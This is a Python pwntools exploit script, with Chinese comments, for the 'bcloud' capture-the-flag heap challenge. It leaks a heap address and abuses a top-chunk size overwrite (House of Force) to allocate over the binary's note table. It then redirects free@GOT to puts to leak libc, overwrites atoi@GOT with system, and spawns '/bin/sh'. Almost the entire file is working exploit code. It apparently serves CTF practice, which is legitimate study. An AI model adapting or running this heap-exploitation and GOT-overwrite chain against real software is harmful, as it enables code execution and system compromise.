#-* coding=utf-8 -*#
from pwn import *

p = process( './bcloud' )

bss = 0x804b0a0

free_got = 0x804b014

puts_plt = 0x8048520

atoi_got = 0x804b03c

system_libc =   254944

atoi_libc = 194640

def new_note( size , content ) :
    p.sendlineafter ( 'option--->>\n' , '1' )
    p.sendlineafter( 'Input the length of the note content:' , str ( size ) )
    p.sendlineafter ( 'Input the content:\n' , content )

def edit_note( id , content ) :
    p.sendlineafter ( 'option--->>\n' , '3' )
    p.sendlineafter ( 'Input the id:\n' , str( id ) )
    p.sendlineafter ( 'Input the new content:\n' , content )

def pwn() :
    p.recvuntil ( 'Input your name:\n'  )
    p.send( 'a'*0x40 )
    data = p.recvuntil( '!' )[-5:-1]
    heap_base = u32( data )
    print "heap_base:" , hex( u32( data ) )
    p.recvuntil( 'Org:\n'  )
    p.send( 'b' * 0x40  )
    p.recvuntil ( 'Host:\n'  )
    p.sendline( '\xff\xff\xff\xff' )
    size = bss - 4 - 8 - ( heap_base + 0xd8 )#计算这次申请的偏移，使得下次申请内存时刚好在0x804b0a0的位置
    print hex(size)
    new_note(  size  , 'aaa' )
    new_note ( 256 ,p32( 0x100 ) * 32 + p32( free_got ) + p32( atoi_got )  + p32( atoi_got )  )
    edit_note ( 0 , p32( puts_plt ) )#修改free的got表项为puts的plt项，下次调用free时导致信息泄露
    p.sendlineafter ( 'option--->>\n' , '4' )
    p.sendlineafter ( 'Input the id:\n' , '1' )
    atoi_add = u32( p.recv( 4 ) )#　leak　atoi的函数地址
    system_add = atoi_add - atoi_libc + system_libc
    edit_note( 2 , p32( system_add ) )
    p.sendlineafter ( 'option--->>\n' , '/bin/sh' )
    p.interactive()

if __name__ == '__main__' :
    pwn()
